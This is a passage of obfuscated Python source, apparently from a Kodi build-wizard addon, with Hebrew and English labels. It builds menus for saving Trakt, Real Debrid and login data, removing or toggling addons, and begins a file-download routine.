	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O00OO000O00OOO0O0 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O000O0000O000OOOO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O0O0OOOO00000OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOOOOO0OO000O0O0O .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3165
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O000O000OO0O0OO0O .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3167
	addFile ('%s שמירת פליליסט לאודר:  '%O00OO000O000OOO00 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3168
	addFile ('%s שמירת הגדרות באפר: '%OOOOOO0O0O00OOOOO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3173
	addFile ('%s שמירת רשימות ריפו:  '%O0000000OOO00O000 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3175
	setView ('files','viewType')#line:3177
def traktMenu ():#line:3179
	O0O000OOOO000000O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3180
	OOOO0O0O0000OO00O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3181
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	addFile ('Save Trakt Data: %s'%O0O000OOOO000000O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOO0O0O0000OO00O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3185
	for O0O000OOOO000000O in traktit .ORDER :#line:3187
		O000O000O0O0O0O0O =TRAKTID [O0O000OOOO000000O ]['name']#line:3188
		O0O00O0OOO0O0OOO0 =TRAKTID [O0O000OOOO000000O ]['path']#line:3189
		OOO0O0OOO00OOOO0O =TRAKTID [O0O000OOOO000000O ]['saved']#line:3190
		O00O0O00OOO000O00 =TRAKTID [O0O000OOOO000000O ]['file']#line:3191
		O000OO000O0O00000 =wiz .getS (OOO0O0OOO00OOOO0O )#line:3192
		OOO0O0OOO00OO000O =traktit .traktUser (O0O000OOOO000000O )#line:3193
		O0OOOOOO0000O00OO =TRAKTID [O0O000OOOO000000O ]['icon']if os .path .exists (O0O00O0OOO0O0OOO0 )else ICONTRAKT #line:3194
		OO0O0O0O0O0O0O0O0 =TRAKTID [O0O000OOOO000000O ]['fanart']if os .path .exists (O0O00O0OOO0O0OOO0 )else FANART #line:3195
		OOO00O00OO000O0O0 =createMenu ('saveaddon','Trakt',O0O000OOOO000000O )#line:3196
		O00O0O0OOOO000O00 =createMenu ('save','Trakt',O0O000OOOO000000O )#line:3197
		OOO00O00OO000O0O0 .append ((THEME2 %'%s Settings'%O000O000O0O0O0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O000OOOO000000O )))#line:3198
		addFile ('[+]-> %s'%O000O000O0O0O0O0O ,'',icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,themeit =THEME3 )#line:3200
		if not os .path .exists (O0O00O0OOO0O0OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =OOO00O00OO000O0O0 )#line:3201
		elif not OOO0O0OOO00OO000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O000OOOO000000O ,icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =OOO00O00OO000O0O0 )#line:3202
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0O0OOO00OO000O ,'authtrakt',O0O000OOOO000000O ,icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =OOO00O00OO000O0O0 )#line:3203
		if O000OO000O0O00000 =="":#line:3204
			if os .path .exists (O00O0O00OOO000O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O000OOOO000000O ,icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =O00O0O0OOOO000O00 )#line:3205
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O000OOOO000000O ,icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =O00O0O0OOOO000O00 )#line:3206
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000OO000O0O00000 ,'',icon =O0OOOOOO0000O00OO ,fanart =OO0O0O0O0O0O0O0O0 ,menu =O00O0O0OOOO000O00 )#line:3207
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3209
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3211
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3214
	setView ('files','viewType')#line:3215
def realMenu ():#line:3217
	OOOO0O00O0OO0O0O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3218
	OOO0OOO0OOOO0OO0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3219
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3220
	addFile ('Save Real Debrid Data: %s'%OOOO0O00O0OO0O0O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3221
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0OOO0OOOO0OO0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3222
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3223
	for O00OO00000OO000OO in debridit .ORDER :#line:3225
		OO0OOO00O0000O00O =DEBRIDID [O00OO00000OO000OO ]['name']#line:3226
		OO0O000000OO0O0OO =DEBRIDID [O00OO00000OO000OO ]['path']#line:3227
		O000OO0000OO0O0O0 =DEBRIDID [O00OO00000OO000OO ]['saved']#line:3228
		OOOO000O000OO00O0 =DEBRIDID [O00OO00000OO000OO ]['file']#line:3229
		O0OOOOOO00O0OO000 =wiz .getS (O000OO0000OO0O0O0 )#line:3230
		OOO0OOOO0O00O00O0 =debridit .debridUser (O00OO00000OO000OO )#line:3231
		O0O000O0OOO000OOO =DEBRIDID [O00OO00000OO000OO ]['icon']if os .path .exists (OO0O000000OO0O0OO )else ICONREAL #line:3232
		OOOOO0OO0O00O0OO0 =DEBRIDID [O00OO00000OO000OO ]['fanart']if os .path .exists (OO0O000000OO0O0OO )else FANART #line:3233
		O000O0O0O00O0000O =createMenu ('saveaddon','Debrid',O00OO00000OO000OO )#line:3234
		OO0OO0OO00OOO0O00 =createMenu ('save','Debrid',O00OO00000OO000OO )#line:3235
		O000O0O0O00O0000O .append ((THEME2 %'%s Settings'%OO0OOO00O0000O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00OO00000OO000OO )))#line:3236
		addFile ('[+]-> %s'%OO0OOO00O0000O00O ,'',icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,themeit =THEME3 )#line:3238
		if not os .path .exists (OO0O000000OO0O0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =O000O0O0O00O0000O )#line:3239
		elif not OOO0OOOO0O00O00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00OO00000OO000OO ,icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =O000O0O0O00O0000O )#line:3240
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0OOOO0O00O00O0 ,'authdebrid',O00OO00000OO000OO ,icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =O000O0O0O00O0000O )#line:3241
		if O0OOOOOO00O0OO000 =="":#line:3242
			if os .path .exists (OOOO000O000OO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00OO00000OO000OO ,icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =OO0OO0OO00OOO0O00 )#line:3243
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00OO00000OO000OO ,icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =OO0OO0OO00OOO0O00 )#line:3244
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOOO00O0OO000 ,'',icon =O0O000O0OOO000OOO ,fanart =OOOOO0OO0O00O0OO0 ,menu =OO0OO0OO00OOO0O00 )#line:3245
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3247
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3249
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3252
	setView ('files','viewType')#line:3253
def loginMenu ():#line:3255
	OO0O00O00O0OO0O00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3256
	OOOOO00OO0O000O0O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3257
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	addFile ('Save Login Data: %s'%OO0O00O00O0OO0O00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOOO00OO0O000O0O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3261
	for OO0O00O00O0OO0O00 in loginit .ORDER :#line:3263
		O00OOOO0OO00OOOO0 =LOGINID [OO0O00O00O0OO0O00 ]['name']#line:3264
		O0OO0O0O0O00OO00O =LOGINID [OO0O00O00O0OO0O00 ]['path']#line:3265
		O0O00OOO0O000O000 =LOGINID [OO0O00O00O0OO0O00 ]['saved']#line:3266
		O0O0OOOO0OO00O0OO =LOGINID [OO0O00O00O0OO0O00 ]['file']#line:3267
		O00OO0O0O00O0O0OO =wiz .getS (O0O00OOO0O000O000 )#line:3268
		O000OOO0OO0OO000O =loginit .loginUser (OO0O00O00O0OO0O00 )#line:3269
		OO00O00000OOOO00O =LOGINID [OO0O00O00O0OO0O00 ]['icon']if os .path .exists (O0OO0O0O0O00OO00O )else ICONLOGIN #line:3270
		OO00OOO00OO00O00O =LOGINID [OO0O00O00O0OO0O00 ]['fanart']if os .path .exists (O0OO0O0O0O00OO00O )else FANART #line:3271
		O000O00O00OO0O000 =createMenu ('saveaddon','Login',OO0O00O00O0OO0O00 )#line:3272
		O0OOO000O00O000OO =createMenu ('save','Login',OO0O00O00O0OO0O00 )#line:3273
		O000O00O00OO0O000 .append ((THEME2 %'%s Settings'%O00OOOO0OO00OOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0O00O00O0OO0O00 )))#line:3274
		addFile ('[+]-> %s'%O00OOOO0OO00OOOO0 ,'',icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,themeit =THEME3 )#line:3276
		if not os .path .exists (O0OO0O0O0O00OO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O000O00O00OO0O000 )#line:3277
		elif not O000OOO0OO0OO000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0O00O00O0OO0O00 ,icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O000O00O00OO0O000 )#line:3278
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000OOO0OO0OO000O ,'authlogin',OO0O00O00O0OO0O00 ,icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O000O00O00OO0O000 )#line:3279
		if O00OO0O0O00O0O0OO =="":#line:3280
			if os .path .exists (O0O0OOOO0OO00O0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0O00O00O0OO0O00 ,icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O0OOO000O00O000OO )#line:3281
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0O00O00O0OO0O00 ,icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O0OOO000O00O000OO )#line:3282
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OO0O0O00O0O0OO ,'',icon =OO00O00000OOOO00O ,fanart =OO00OOO00OO00O00O ,menu =O0OOO000O00O000OO )#line:3283
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3285
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3287
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3290
	setView ('files','viewType')#line:3291
def fixUpdate ():#line:3293
	if KODIV <17 :#line:3294
		O0OO0OOO000O0O0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3295
		try :#line:3296
			os .remove (O0OO0OOO000O0O0O0 )#line:3297
		except Exception as O0OO00O000000OOOO :#line:3298
			wiz .log ("Unable to remove %s, Purging DB"%O0OO0OOO000O0O0O0 )#line:3299
			wiz .purgeDb (O0OO0OOO000O0O0O0 )#line:3300
	else :#line:3301
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3302
def removeAddonMenu ():#line:3304
	OOO0O00OO00OO0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3305
	OO0O00O00OOO0OOOO =[];OOO0OO00OO00O0OO0 =[]#line:3306
	for O0O000OO00O00O0OO in sorted (OOO0O00OO00OO0000 ,key =lambda O0000O000OO0O00O0 :O0000O000OO0O00O0 ):#line:3307
		OOOO0000OO0O000OO =os .path .split (O0O000OO00O00O0OO [:-1 ])[1 ]#line:3308
		if OOOO0000OO0O000OO in EXCLUDES :continue #line:3309
		elif OOOO0000OO0O000OO in DEFAULTPLUGINS :continue #line:3310
		elif OOOO0000OO0O000OO =='packages':continue #line:3311
		OO000O0000000OOO0 =os .path .join (O0O000OO00O00O0OO ,'addon.xml')#line:3312
		if os .path .exists (OO000O0000000OOO0 ):#line:3313
			O0O0O00OOO00O0OO0 =open (OO000O0000000OOO0 )#line:3314
			OO0000000OO000000 =O0O0O00OOO00O0OO0 .read ()#line:3315
			OO00O00OOOOO0O0OO =wiz .parseDOM (OO0000000OO000000 ,'addon',ret ='id')#line:3316
			OO0OO0000000O0OOO =OOOO0000OO0O000OO if len (OO00O00OOOOO0O0OO )==0 else OO00O00OOOOO0O0OO [0 ]#line:3318
			try :#line:3319
				OO000O00OO0O00000 =xbmcaddon .Addon (id =OO0OO0000000O0OOO )#line:3320
				OO0O00O00OOO0OOOO .append (OO000O00OO0O00000 .getAddonInfo ('name'))#line:3321
				OOO0OO00OO00O0OO0 .append (OO0OO0000000O0OOO )#line:3322
			except :#line:3323
				pass #line:3324
	if len (OO0O00O00OOO0OOOO )==0 :#line:3325
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3326
		return #line:3327
	if KODIV >16 :#line:3328
		O0OOOOO000OO0O00O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O00O00OOO0OOOO )#line:3329
	else :#line:3330
		O0OOOOO000OO0O00O =[];O0OO0000OO0OO000O =0 #line:3331
		O0OO0OOOOOOOOOOOO =["-- Click here to Continue --"]+OO0O00O00OOO0OOOO #line:3332
		while not O0OO0000OO0OO000O ==-1 :#line:3333
			O0OO0000OO0OO000O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO0OOOOOOOOOOOO )#line:3334
			if O0OO0000OO0OO000O ==-1 :break #line:3335
			elif O0OO0000OO0OO000O ==0 :break #line:3336
			else :#line:3337
				OO0OOOO0OO0O0000O =(O0OO0000OO0OO000O -1 )#line:3338
				if OO0OOOO0OO0O0000O in O0OOOOO000OO0O00O :#line:3339
					O0OOOOO000OO0O00O .remove (OO0OOOO0OO0O0000O )#line:3340
					O0OO0OOOOOOOOOOOO [O0OO0000OO0OO000O ]=OO0O00O00OOO0OOOO [OO0OOOO0OO0O0000O ]#line:3341
				else :#line:3342
					O0OOOOO000OO0O00O .append (OO0OOOO0OO0O0000O )#line:3343
					O0OO0OOOOOOOOOOOO [O0OO0000OO0OO000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O00O00OOO0OOOO [OO0OOOO0OO0O0000O ])#line:3344
	if O0OOOOO000OO0O00O ==None :return #line:3345
	if len (O0OOOOO000OO0O00O )>0 :#line:3346
		wiz .addonUpdates ('set')#line:3347
		for O0O000O00O00OO0O0 in O0OOOOO000OO0O00O :#line:3348
			removeAddon (OOO0OO00OO00O0OO0 [O0O000O00O00OO0O0 ],OO0O00O00OOO0OOOO [O0O000O00O00OO0O0 ],True )#line:3349
		xbmc .sleep (1000 )#line:3351
		if INSTALLMETHOD ==1 :OOO0O0OOO00000OOO =1 #line:3353
		elif INSTALLMETHOD ==2 :OOO0O0OOO00000OOO =0 #line:3354
		else :OOO0O0OOO00000OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3355
		if OOO0O0OOO00000OOO ==1 :wiz .reloadFix ('remove addon')#line:3356
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3357
def removeAddonDataMenu ():#line:3359
	if os .path .exists (ADDOND ):#line:3360
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3361
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3363
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3364
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3365
		O0OO0O0OO00OOOO00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3366
		for OOOOOOO0O0OO0O000 in sorted (O0OO0O0OO00OOOO00 ,key =lambda OO0OOOO0OO0OO00O0 :OO0OOOO0OO0OO00O0 ):#line:3367
			O00O0000OOO0000O0 =OOOOOOO0O0OO0O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3368
			OO0OOOO0O0OOO0OO0 =os .path .join (OOOOOOO0O0OO0O000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3369
			O0OOOO0O0OO0OO0O0 =os .path .join (OOOOOOO0O0OO0O000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3370
			OOO00O00OO00O0O0O =O00O0000OOO0000O0 #line:3371
			O0O0OO0000O0O00O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3372
			for OOOOOO0OOO0O0OO0O in O0O0OO0000O0O00O0 :#line:3373
				OOO00O00OO00O0O0O =OOO00O00OO00O0O0O .replace (OOOOOO0OOO0O0OO0O ,O0O0OO0000O0O00O0 [OOOOOO0OOO0O0OO0O ])#line:3374
			if O00O0000OOO0000O0 in EXCLUDES :OOO00O00OO00O0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO00O00OO00O0O0O #line:3375
			else :OOO00O00OO00O0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO00O00OO00O0O0O #line:3376
			addFile (' %s'%OOO00O00OO00O0O0O ,'removedata',O00O0000OOO0000O0 ,icon =OO0OOOO0O0OOO0OO0 ,fanart =O0OOOO0O0OO0OO0O0 ,themeit =THEME2 )#line:3377
	else :#line:3378
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3379
	setView ('files','viewType')#line:3380
def enableAddons ():#line:3382
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3383
	O0O0OO000OOO0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3384
	OO000O00OOO0OOOOO =0 #line:3385
	for OOOO0OO0O0000OOOO in sorted (O0O0OO000OOO0O00O ,key =lambda O00O00O0OOOO00OOO :O00O00O0OOOO00OOO ):#line:3386
		OOOOOOOOOOOOOO0OO =os .path .split (OOOO0OO0O0000OOOO [:-1 ])[1 ]#line:3387
		if OOOOOOOOOOOOOO0OO in EXCLUDES :continue #line:3388
		if OOOOOOOOOOOOOO0OO in DEFAULTPLUGINS :continue #line:3389
		OOO00OO0000O00000 =os .path .join (OOOO0OO0O0000OOOO ,'addon.xml')#line:3390
		if os .path .exists (OOO00OO0000O00000 ):#line:3391
			OO000O00OOO0OOOOO +=1 #line:3392
			O0O0OO000OOO0O00O =OOOO0OO0O0000OOOO .replace (ADDONS ,'')[1 :-1 ]#line:3393
			O0O0O0OOO0O0O000O =open (OOO00OO0000O00000 )#line:3394
			O0O0OOOO0OOOOOOO0 =O0O0O0OOO0O0O000O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3395
			OO000OO00O0OOOO0O =wiz .parseDOM (O0O0OOOO0OOOOOOO0 ,'addon',ret ='id')#line:3396
			OO00OOOO00OO0O000 =wiz .parseDOM (O0O0OOOO0OOOOOOO0 ,'addon',ret ='name')#line:3397
			try :#line:3398
				O0O00O0O000O00OO0 =OO000OO00O0OOOO0O [0 ]#line:3399
				OOOO0OOOOO0OO0O00 =OO00OOOO00OO0O000 [0 ]#line:3400
			except :#line:3401
				continue #line:3402
			try :#line:3403
				O000OO00O00O000OO =xbmcaddon .Addon (id =O0O00O0O000O00OO0 )#line:3404
				O00O0000000OOO000 ="[COLOR green][Enabled][/COLOR]"#line:3405
				OO0000OOO00OO0O00 ="false"#line:3406
			except :#line:3407
				O00O0000000OOO000 ="[COLOR red][Disabled][/COLOR]"#line:3408
				OO0000OOO00OO0O00 ="true"#line:3409
				pass #line:3410
			O00O0O000000OOO0O =os .path .join (OOOO0OO0O0000OOOO ,'icon.png')if os .path .exists (os .path .join (OOOO0OO0O0000OOOO ,'icon.png'))else ICON #line:3411
			OO000OO0O000O0OO0 =os .path .join (OOOO0OO0O0000OOOO ,'fanart.jpg')if os .path .exists (os .path .join (OOOO0OO0O0000OOOO ,'fanart.jpg'))else FANART #line:3412
			addFile ("%s %s"%(O00O0000000OOO000 ,OOOO0OOOOO0OO0O00 ),'toggleaddon',O0O0OO000OOO0O00O ,OO0000OOO00OO0O00 ,icon =O00O0O000000OOO0O ,fanart =OO000OO0O000O0OO0 )#line:3413
			O0O0O0OOO0O0O000O .close ()#line:3414
	if OO000O00OOO0OOOOO ==0 :#line:3415
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3416
	setView ('files','viewType')#line:3417
def changeFeq ():#line:3419
	OOO000O00OO00000O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3420
	O000O0O0OOOO00OOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO000O00OO00000O )#line:3421
	if not O000O0O0OOOO00OOO ==-1 :#line:3422
		wiz .setS ('autocleanfeq',str (O000O0O0OOOO00OOO ))#line:3423
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO000O00OO00000O [O000O0O0OOOO00OOO ]))#line:3424
def developer ():#line:3426
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3427
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3428
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3429
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3430
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3431
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3432
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3433
	setView ('files','viewType')#line:3435
def download (OOOOO00OOOOOO0000 ,O0000O0OOO000OOO0 ):#line:3440
  OO00O00000OO000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3441
  O00OOO0000OO0OOO0 =xbmcgui .DialogProgress ()#line:3442
  O00OOO0000OO0OOO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3443
  O0OO0O0OO0O0OO0OO =os .path .join (OO00O00000OO000OO ,'isr.zip')#line:3444
  O000000000O000O00 =urllib2 .Request (OOOOO00OOOOOO0000 )#line:3445
  O00O000O0O0OOOO00 =urllib2 .urlopen (O000000000O000O00 )#line:3446
  O0000O00O0OOOO00O =xbmcgui .DialogProgress ()#line:3448
  O0000O00O0OOOO00O .create ("Downloading","Downloading "+name )#line:3449
  O0000O00O0OOOO00O .update (0 )#line:3450
  O000OOO0O000OO000 =O0000O0OOO000OOO0 #line:3451
  O000OO000000OOO00 =open (O0OO0O0OO0O0OO0OO ,'wb')#line:3452
  try :#line:3454
    O0OOOO00O0O0O0OO0 =O00O000O0O0OOOO00 .info ().getheader ('Content-Length').strip ()#line:3455
    O0OO0OO000OOO0000 =True #line:3456
  except AttributeError :#line:3457
        O0OO0OO000OOO0000 =False #line:3458
  if O0OO0OO000OOO0000 :#line:3460
        O0OOOO00O0O0O0OO0 =int (O0OOOO00O0O0O0OO0 )#line:3461
  O0OO00OOOOO0O0OOO =0 #line:3463
  OOOO000OOO0O0O0O0 =time .time ()#line:3464
  while True :#line:3465
        OOO0O000OOO0OO0O0 =O00O000O0O0OOOO00 .read (8192 )#line:3466
        if not OOO0O000OOO0OO0O0 :#line:3467
            sys .stdout .write ('\n')#line:3468
            break #line:3469
